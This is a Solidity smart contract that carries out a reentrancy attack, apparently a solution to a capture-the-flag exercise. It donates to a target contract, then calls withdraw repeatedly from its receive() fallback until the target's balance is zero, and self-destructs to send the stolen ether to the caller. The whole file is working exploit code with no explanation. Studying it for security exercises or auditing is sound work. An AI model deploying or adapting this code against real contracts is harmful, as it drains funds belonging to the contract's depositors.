// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address) external payable;
    function withdraw(uint256) external;
}

contract AttackReentrance {
    IReentrance private immutable target;

    constructor(address _target) {
        target = IReentrance(_target);
    }

    function hackContract() external payable {
        target.donate{value: 1e18}(address(this));
        target.withdraw(1e18);

        require(address(target).balance == 0, "Did not drain contract");
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint256 amountToWithdraw;
        if (1e18 <= address(target).balance) {
            amountToWithdraw = 1e18;
        } else {
            amountToWithdraw = address(target).balance;
        }

        if (amountToWithdraw > 0) {
            target.withdraw(amountToWithdraw);
        }
    }
}
